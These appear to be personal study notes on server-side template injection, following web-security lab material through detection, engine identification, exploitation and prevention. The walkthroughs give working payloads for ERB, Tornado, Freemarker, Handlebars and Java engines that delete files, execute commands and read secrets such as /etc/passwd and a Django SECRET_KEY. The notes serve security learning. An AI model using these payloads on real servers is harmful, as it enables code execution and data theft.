## Definition
when an attacker is able to:
- use native template syntax
	- to inject a malicious payload into a template
		- which is then executed server-side

Template engines are designed to:
- generate web pages by combining fixed templates with volatile data. 
=>
Server-side template injection attacks can occur:
- when user input is concatenated directly into a template
- rather than passed in as data.
- This allows attackers to:
	- inject arbitrary template directives 
		- in order to manipulate the template engine,
		- often enabling them to take complete control of the server

As the name suggests, server-side template injection payloads:
are delivered and evaluated -->    server-side, 
                            potentially making them much more dangerous than a typical client-side template injection

## How arise
Server-side template injection vulnerabilities arise:
when user input:
- is concatenated into templates 
- rather than being passed in as data.

Static templates that simply provide placeholders into which dynamic content is rendered:
- are generally not vulnerable to server-side template injection

The classic example is:
an email that greets each user by their name, 
such as the following extract from a Twig template:
`$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );`

This is not vulnerable to server-side template injection:
because the user's first name -->   is merely passed into the template as data.

However, as templates are simply strings:
- developers sometimes directly concatenate user input into templates prior to rendering.

Let's take a similar example to the one above, but this time:
- users are able to customize parts of the email before it is sent
  
For example, they might be able to choose the name that is used:
`$output = $twig->render("Dear " . $_GET['name']);`

In this example, instead of a static value being passed into the template:
- part of the template itself is being dynamically generated using the `GET` parameter `name`
- As template syntax is evaluated server-side:
	- this potentially allows an attacker to place a server-side template injection payload inside the `name` parameter as follows:
	  `http://vulnerable-website.com/?name={{bad-stuff-here}}`

Vulnerabilities like this:
- are sometimes caused by accident 
	- due to poor template design by people unfamiliar with the security implications

However, sometimes:
- this behavior is actually implemented intentionally. 
- For example, some websites:
	- deliberately allow certain privileged users, such as content editors, 
		- to edit or submit custom templates by design. 
		- This poses a huge security risk if an attacker is able to compromise an account with such privileges

## Constructing a server-side template injection attack
Identifying server-side template injection vulnerabilities and crafting a successful attack:
- typically involves the following high-level process
  ![[Pasted image 20240917093828.png|350]]

### Detect
The simplest initial approach is to:
- try fuzzing the template by injecting a sequence of special ch commonly used in template expressions
	- such as `${{<%[%'"}}%\`

If an exception is raised,:
=>
the injected template syntax is -->  potentially being interpreted by the server in some way

This is one sign that a vulnerability to server-side template injection may exist

Server-side template injection vulnerabilities:
occur in two distinct contexts -->  each of which requires its own detection method

they are:
- Plain text context
- Code context
#### Plain text context
Most template languages allow you to:
- freely input content either by using HTML tags directly or by using the template's native syntax
	- which will be rendered to HTML on the back-end before the HTTP response is sent

For example, consider a template that contains the following vulnerable code:
`render('Hello ' + username)`

During auditing, we test for server-side template injection by requesting a URL such as:
`http://vulnerable-website.com/?username=${7*7}`
=>
If the resulting output contains `Hello 49`:
- this shows that the mathematical operation is being evaluated server-side
- This is a good proof of concept for a server-side template injection vulnerability.

Note that the specific syntax required to successfully evaluate the mathematical operation:
- will vary -->   depending on which template engine is being used

#### Code context
In other cases, the vulnerability:
- is exposed by user input -->    being placed within a template expression,
                            as we saw earlier with our email example

This may take the form of:
- a user-controllable variable name -->  being placed inside a parameter, such as:

```
greeting = getQueryParameter('greeting')
engine.render("Hello {{"+greeting+"}}", data)
```
=>
On the website, the resulting URL would be something like:
`http://vulnerable-website.com/?greeting=data.username`

This would be rendered in the output to `Hello Carlos`, for example.

This context is easily missed during assessment:
- because it doesn't result in obvious XSS 
- and is almost indistinguishable from a simple hashmap lookup.

One method of testing for server-side template injection in this context:
- is to first establish that the parameter doesn't contain a direct XSS vulnerability 
- by injecting arbitrary HTML into the value:
  `http://vulnerable-website.com/?greeting=data.username<tag>`

In the absence of XSS:
- this will usually either result in a -->    blank entry in the output (just `Hello` with no 
							     username) encoded tags, or an error message. 
The next step is to:
- try and break out of the statement using common templating syntax and attempt to inject arbitrary HTML after it:
  `http://vulnerable-website.com/?greeting=data.username}}<tag>`

If this again results in an error or blank output:
=>
- you have either used syntax from the wrong templating language 
- or, if no template-style syntax appears to be valid, server-side template injection is not possible

Alternatively, if the output is rendered correctly, along with the arbitrary HTML:
=>
this is a key indication that -->   a server-side template injection vulnerability is present:
Es:
`Hello Carlos<tag>`

### Identify
Once you have detected the template injection potential:
the next step is to -->   identify the template engine

Although there are a huge number of templating languages:
- many of them use -->    very similar syntax 
				      that is specifically chosen not to clash with HTML characters
- As a result:
	- it can be relatively simple to create probing payloads 
		- to test which template engine is being used.

Simply submitting invalid syntax:
- is often enough bc the resulting error mex will tell you exactly what the template engine is
- and sometimes even which version

For example, the invalid expression `<%=foobar%>` triggers the following response from the Ruby-based ERB engine:
```
(erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError)
from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'
from /usr/lib/ruby/2.5.0/erb.rb:876:in `result'
from -e:4:in `<main>'
```

Otherwise, you'll need to:
- manually test different language-specific payloads 
- study how they are interpreted by the template engine.
- Using a process of elimination based on which syntax appears to be valid or invalid:
	- you can narrow down the options quicker than you might think

A common way of doing this is to:
- inject arbitrary mathematical operations using syntax from different template engines.
=>
You can then observe whether they are successfully evaluated. 
To help with this process, you can use a decision tree similar to the following:
![[Pasted image 20240917100300.png|700]]

You should be aware that:
- the same payload can sometimes return:
	- a successful response in more than one template language

For example, the payload `{{7*'7'}}` returns:
- `49` in Twig 
- `7777777` in Jinja2
=>
it is important not to jump to conclusions based on a single successful response

### Exploit
Once you discover a server-side template injection vulnerability:
- and identify the template engine being used
	- successful exploitation typically involves the following process:
		- Read
			- Template Syntax
			- Security Documentation
			- Documented exploits
		- Explore the environment 
		- Create a custom attack

#### Read
Unless you already know the template engine inside out:
- reading its documentation -->  is usually the first place to start

##### Learn the basic template syntax
Learning the basic syntax is obviously important:
- along with key functions and handling of variables

Even something as simple as learning how to embed native code blocks in the template:
- can sometimes quickly lead to an exploit

For example, once you know that the Python-based Mako template engine is being used:
- achieving remote code execution could be as simple as:

```
<%
                import os
                x=os.popen('id').read()
                %>
                ${x}
```

###### Basic server-side template injection
- Notice that when you try to view more details about the first product, a `GET` request uses the `message` parameter to render `"Unfortunately this product is out of stock"` on the home page.
- In the ERB documentation, discover that the syntax `<%= someExpression %>` is used to evaluate an expression and render the result on the page.
- Use ERB template syntax to create a test payload containing a mathematical operation, for example:
  `<%= 7*7 %>`
- URL-encode this payload and insert it as the value of the `message` parameter in the URL
	=>
	- capture a GET request for "View Details" of one of the product
	- send it to repeater
	- change the `/?message=...` to `/?message=<%= 7*7 %>`
	- then select `<%= 7*7 %>` and press CTRL+U to URL encode
	- send the packet
- The output will be the number 49. 
	- This indicates that we may have a server-side template injection vulnerability.
- From the Ruby documentation, discover the `system()` method, which can be used to execute arbitrary operating system commands.
- Construct a payload to delete Carlos's file as follows:
  `<%= system("rm /home/carlos/morale.txt") %>`
- => 
  `/?message=<%= system("rm /home/carlos/morale.txt") %>` and URL encode again the payload

###### Basic server-side template injection (code context)
- While proxying traffic through Burp, log in and post a comment on one of the blog posts.
- Notice that on the "My account" page, you can select whether you want the site to use your full name, first name, or nickname. 
	- When you submit your choice, a `POST` request sets the value of the parameter `blog-post-author-display` to either `user.name`, `user.first_name`, or `user.nickname`. 
	- When you load the page containing your comment, the name above your comment is updated based on the current value of this parameter
	  
- In Burp, go to "Proxy" > "HTTP history" and find the request that sets this parameter, namely `POST /my-account/change-blog-post-author-display`, and send it to Burp Repeater.
- Study the Tornado documentation to discover that template expressions are surrounded with double curly braces, such as `{{someExpression}}`. 
	- In Burp Repeater, notice that you can escape out of the expression and inject arbitrary template syntax as follows:
	  `blog-post-author-display=user.name}}{{7*7}}`
	  
- Reload the page containing your test comment. 
	- Notice that the username now says `Peter Wiener49}}`, indicating that a server-side template injection vulnerability may exist in the code context.
	- 
- In the Tornado documentation, identify the syntax for executing arbitrary Python: 
  `{% somePython %}`
  
- Study the Python documentation to discover that by importing the `os` module, you can use the `system()` method to execute arbitrary system commands.
- Combine this knowledge to construct a payload that deletes Carlos's file:
  `{% import os %} {{os.system('rm /home/carlos/morale.txt')`
- In Burp Repeater, go back to `POST /my-account/change-blog-post-author-display`. 
	- Break out of the expression, and inject your payload into the parameter, remembering to URL-encode it as follows:
	  `blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')`
- Reload the page containing your comment to execute the template and solve the lab

##### Read about the security implications
In addition to providing the fundamentals of how to create and use templates:
- the documentation may also provide some sort of -->  "Security" section

The name of this section will vary:
- but it will usually outline all the potentially -->    dangerous things that people should 
										  avoid doing with the template 
- This can be an invaluable resource:
	- even acting as a kind of cheat sheet
		- for which behaviors you should look for during auditing, 
		  as well as how to exploit them.

Even if there is no dedicated "Security" section:
- if a particular built-in object or function can pose a security ris
  =>
  there is almost always a warning of some kind in the documentation
  - The warning may not provide much detail
  - but at the very least it should flag this particular built-in as something to investigate.

For example, in ERB, the documentation reveals that you can list all directories and then read arbitrary files as follows:
```
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
```

###### Server-side template injection using documentation
1. Log in and edit one of the product description templates.
	1. Notice that this template engine uses the syntax `${someExpression}` to render the result of an expression on the page. 
	2. Either enter your own expression or change one of the existing ones to refer to an object that doesn't exist, such as `${foobar}`, and save the template. 
	3. The error message in the output shows that the Freemarker template engine is being used.
	   
2. Study the Freemarker documentation and find that appendix contains an FAQs section with the question "Can I allow users to upload templates and what are the security implications?". 
	1. The answer describes how the `new()` built-in can be dangerous
	   
3. Go to the "Built-in reference" section of the documentation and find the entry for `new()`
	1. This entry further describes how `new()` is a security concern because it can be used to create arbitrary Java objects that implement the `TemplateModel` interface
	   
4. Load the JavaDoc for the `TemplateModel` class, and review the list of "All Known Implementing Classes".
5. Observe that there is a class called `Execute`, which can be used to execute arbitrary shell commands
6. Either attempt to construct your own exploit, or find [@albinowax's exploit](https://portswigger.net/research/server-side-template-injection) on our research page and adapt it as follows:
   `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }`
   
7. Remove the invalid syntax that you entered earlier, and insert your new payload into the template.
8. Save the template and view the product page to solve the lab

##### Look for known exploits
Another key aspect of exploiting server-side template injection vulnerabilities:
- is being good at -->  finding additional resources online

Once you are able to identify the template engine being used:
- you should browse the web for any vulnerabilities that others may have already discovered. 
- Due to the widespread use of some of the major template engines:
	- it is sometimes possible to find well-documented exploits 
		- that you might be able to tweak to exploit your own target website

###### Server-side template injection in an unknown language with a documented exploit
- Notice that when you try to view more details about the first product, a `GET` request uses the `message` parameter to render `"Unfortunately this product is out of stock"` on the home page.
- Experiment by injecting a fuzz string containing template syntax from various different template languages, such as `${{<%[%'"}}%\`, into the `message` parameter. 
	- Notice that when you submit invalid syntax, an error message is shown in the output. This identifies that the website is using Handlebars
	  
- Search the web for "Handlebars server-side template injection". 
	- You should find a well-known exploit posted by `@Zombiehelp54`
- Modify this exploit so that it calls `require("child_process").exec("rm /home/carlos/morale.txt")` as follows:

```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```
- URL encode your exploit and add it as the value of the message parameter in the URL.
- The final exploit should look like this, but remember to replace `YOUR-LAB-ID` with your own lab ID:
  `https://YOUR-LAB-ID.web-security-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d`
  - The lab should be solved when you load the URL

#### Explore
The next step is to:
- explore the environment
- try to discover all the objects to which you have access.

Many template engines expose a "self" or "environment" object of some kind:
- which acts like a namespace containing all objects, methods, and attributes that are supported by the template engine
=>
If such an object exists:
- you can potentially use it to:
	- generate a list of objects that are in scope

For example, in Java-based templating languages, you can sometimes list all variables in the environment using the following injection:
`${T(java.lang.System).getenv()}`

##### Developer-supplied objects
It is important to note that websites will contain both.
- built-in objects provided by the template 
- custom, site-specific objects that have been supplied by the web developer.
=>
You should pay particular attention to these non-standard objects:
- bc they are especially likely to contain sensitive information or exploitable methods
- As these objects can vary between different templates within the same website:
	- be aware that you might need to study an object's behavior in the context of each distinct template before you find a way to exploit it.

While server-side template injection can potentially lead to remote code execution and full takeover of the server:
in practice -->   this is not always possible to achieve.

However, just because you have ruled out remote code execution:
- that doesn't necessarily mean there is no potential for a different kind of exploit. 
- You can still leverage server-side template injection vulnerabilities for other high-severity exploits, such as path traversal to gain access to sensitive data

###### Server-side template injection with information disclosure via user-supplied objects
- Log in and edit one of the product description templates.
- Change one of the template expressions to something invalid, such as a fuzz string `${{<%[%'"}}%\`, and save the template. 
	- The error message in the output hints that the Django framework is being used.
- Study the Django documentation and notice that the built-in template tag `debug` can be called to display debugging information.
- In the template, remove your invalid syntax and enter the following statement to invoke the `debug` built-in:
  `{% debug %}`

- Save the template. 
	- The output will contain a list of objects and properties to which you have access from within this template. 
	- Crucially, notice that you can access the `settings` object
	  
- Study the `settings` object in the Django documentation and notice that it contains a `SECRET_KEY` property, which has dangerous security implications if known to an attacker.
- In the template, remove the `{% debug %}` statement and enter the expression `{{settings.SECRET_KEY}}`
- Save the template to output the framework's secret key.
- Click the "Submit solution" button and submit the secret key to solve the lab

#### Create a custom attack
Sometimes you will need to -->   construct a custom exploit
For example, you might find that the template engine executes templates inside a sandbox:
which can make exploitation difficult, or even impossible.

After identifying the attack surface:
- if there is no obvious way to exploit the vulnerability
  =>
  you should proceed with traditional auditing techniques by:
	- reviewing each function for exploitable behavior. 
	- By working methodically through this process:
		- you may sometimes be able to construct a complex attack that is even able to exploit more secure targets

##### Constructing a custom exploit using an object chain
As described above, the first step is to:
- identify objects and methods to which you have access
=>
- Some of the objects may immediately jump out as interesting. 
- By combining your own knowledge and the information provided in the documentation:
	- you should be able to put together a shortlist of objects that you want to investigate more thoroughly.

When studying the documentation for objects:
- pay particular attention to which methods these objects grant access to
- as well as which objects they return
=>
By drilling down into the documentation:
- you can discover combinations of objects and methods that you can chain together.
- Chaining together the right objects and methods sometimes allows you to:
	- gain access to dangerous functionality and sensitive data that initially appears out of reach.

For example, in the Java-based template engine Velocity:
- you have access to a `ClassTool` object called `$class`. 
- Studying the documentation reveals that you can:
	- chain the `$class.inspect()` method and `$class.type` property to obtain references to arbitrary objects.
=>
In the past, this has been exploited to execute shell commands on the target system as follows:
`$class.inspect("java.lang.Runtime").type.getRuntime().exec("bad-stuff-here")`

###### Server-side template injection in a sandboxed environment
- Log in and edit one of the product description templates. 
	- Notice that you have access to the `product` object.
	  
- Load the JavaDoc for the `Object` class to find methods that should be available on all objects. 
	- Confirm that you can execute `${object.getClass()}` using the `product` object.
	  
- Explore the documentation to find a sequence of method invocations that grant access to a class with a static method that lets you read a file, such as:
    `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}`
    
- Enter this payload in one of the templates and save. 
- The output will contain the contents of the file as decimal ASCII code points.
- Convert the returned decimal bytes to ASCII.
- Click the "Submit solution" button and submit this string to solve the lab

##### Constructing a custom exploit using developer-supplied objects
Some template engines run in:
- a secure, locked-down environment by default 
- in order to mitigate the associated risks as much as possible

Although this makes it difficult to exploit such templates for remote code execution:
- developer-created objects that are exposed to the template:
	- can offer a further, less battle-hardened attack surface.

However, while substantial documentation is usually provided for template built-ins:
- site-specific objects are almost certainly not documented at all
  =>
-  working out how to exploit them will require you to:
	- investigate the website's behavior manually 
		- to identify the attack surface and construct your own custom exploit accordingly
###### Server-side template injection with a custom exploit
1. While proxying traffic through Burp, log in and post a comment on one of the blogs.
2. Go to the "My account" page. Notice that the functionality for setting a preferred name is vulnerable to server-side template injection, as we saw in a previous lab. 
3. You should also have noticed that you have access to the `user` object.
4. Investigate the custom avatar functionality. 
	1. Notice that when you upload an invalid image, the error message discloses a method called `user.setAvatar()`. 
	2. Also take note of the file path `/home/carlos/User.php`. You will need this later.
5. Upload a valid image as your avatar and load the page containing your test comment.
6. In Burp Repeater, open the `POST` request for changing your preferred name and use the `blog-post-author-display` parameter to set an arbitrary file as your avatar:
   `user.setAvatar('/etc/passwd')`
   
6. Load the page containing your test comment to render the template. 
	1. Notice that the error message indicates that you need to provide an image MIME type as the second argument.
	2. Provide this argument and view the comment again to refresh the template:
	   `user.setAvatar('/etc/passwd','image/jpg')`
	   
7. To read the file, load the avatar using `GET /avatar?avatar=wiener`. 
8. This will return the contents of the `/etc/passwd` file, confirming that you have access to arbitrary files.
9. Repeat this process to read the PHP file that you noted down earlier:
   `user.setAvatar('/home/carlos/User.php','image/jpg')`
   
9. In the PHP file, Notice that you have access to the `gdprDelete()` function, which deletes the user's avatar. 
	1. You can combine this knowledge to delete Carlos's file.
	   
10. First set the target file as your avatar, then view the comment to execute the template:
    `user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')`
    
11. Invoke the `user.gdprDelete()` method and view your comment again to solve the lab


## Preventing
The best way to prevent server-side template injection is to:
- not allow any users to modify or submit new templates. 
  However, this is sometimes unavoidable due to business requirements.

One of the simplest ways is to:
- always use a "logic-less" template engine, such as Mustache, unless absolutely necessary
  =>
- Separating the logic from presentation as much as possible:
	- can greatly reduce your exposure to the most dangerous template-based attacks.

Another measure is to:
- only execute users' code in a sandboxed environment 
- where potentially dangerous modules and functions have been removed altogether.
- Unfortunately, sandboxing untrusted code is inherently difficult and prone to bypasses.

Finally, another complementary approach is to:
- accept that arbitrary code execution is all but inevitable 
- and apply your own sandboxing by deploying your template environment in a locked-down Docker container, for example.